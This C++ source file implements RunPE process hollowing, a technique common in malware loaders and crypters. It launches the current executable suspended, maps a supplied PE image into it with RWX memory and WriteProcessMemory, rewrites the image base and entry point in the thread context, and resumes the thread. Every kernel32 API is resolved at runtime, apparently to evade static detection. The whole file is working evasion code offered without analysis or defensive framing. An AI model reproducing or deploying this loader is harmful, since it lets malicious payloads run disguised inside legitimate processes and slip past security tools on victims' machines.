#include "runpe.h"

#define GET_FUNCTION_PTR(function, fname) reinterpret_cast<decltype(&function)>(RpGetProcAddress("kernel32.dll", fname))

void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
    PVOID pImage = static_cast<PVOID>(Image.data());

    auto DosHeader = PIMAGE_DOS_HEADER{};
    auto NtHeaders = PIMAGE_NT_HEADERS64{};
    auto SectionHeader = PIMAGE_SECTION_HEADER{};

    auto si = STARTUPINFOA{};
    memset(&si, 0, sizeof(si));

    auto pi = PROCESS_INFORMATION{};
    memset(&pi, 0, sizeof(pi));

    char FilePath[256];
    GET_FUNCTION_PTR(GetModuleFileNameA, "GetModuleFileNameA")(nullptr, FilePath, MAX_PATH);

    DosHeader = PIMAGE_DOS_HEADER(pImage);
    NtHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew);

    if (NtHeaders->Signature == IMAGE_NT_SIGNATURE) {
        if (GET_FUNCTION_PTR(CreateProcessA, "CreateProcessA")(FilePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi)) {

            auto ctx = PCONTEXT{};
            ctx = LPCONTEXT(GET_FUNCTION_PTR(VirtualAlloc, "VirtualAlloc")(0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));

            ctx->ContextFlags = CONTEXT_FULL;

            if (GET_FUNCTION_PTR(GetThreadContext, "GetThreadContext")(pi.hThread, LPCONTEXT(ctx))) {
                auto ImageBase = GET_FUNCTION_PTR(VirtualAllocEx, "VirtualAllocEx")(pi.hProcess, LPVOID(NtHeaders->OptionalHeader.ImageBase), NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, ImageBase, pImage, NtHeaders->OptionalHeader.SizeOfHeaders, NULL);

                for (auto i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
                    SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew + 264 + (i * 40));
                    GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, LPVOID(ULONGLONG(ImageBase) + SectionHeader->VirtualAddress), LPVOID(ULONGLONG(pImage) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
                    GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, LPVOID(ctx->Rdx + 0x10), LPVOID(&NtHeaders->OptionalHeader.ImageBase), 8, NULL);
                }

                ctx->Rcx = ULONGLONG(ImageBase) + NtHeaders->OptionalHeader.AddressOfEntryPoint;
                GET_FUNCTION_PTR(SetThreadContext, "SetThreadContext")(pi.hThread, LPCONTEXT(ctx));
                GET_FUNCTION_PTR(ResumeThread, "ResumeThread")(pi.hThread);
                GET_FUNCTION_PTR(WaitForSingleObject, "WaitForSingleObject")(pi.hProcess, 0);
            }
        }
    }
}

PVOID RunPE::RpGetProcAddress(const char* Mod, const char* Proc) {
    auto Module = GetModuleHandleA(Mod);
    if (Module) {
        return GetProcAddress(Module, Proc);
    }
    else {
        Module = LoadLibraryA(Mod);
        return Module ? GetProcAddress(Module, Proc) : nullptr;
    }
}

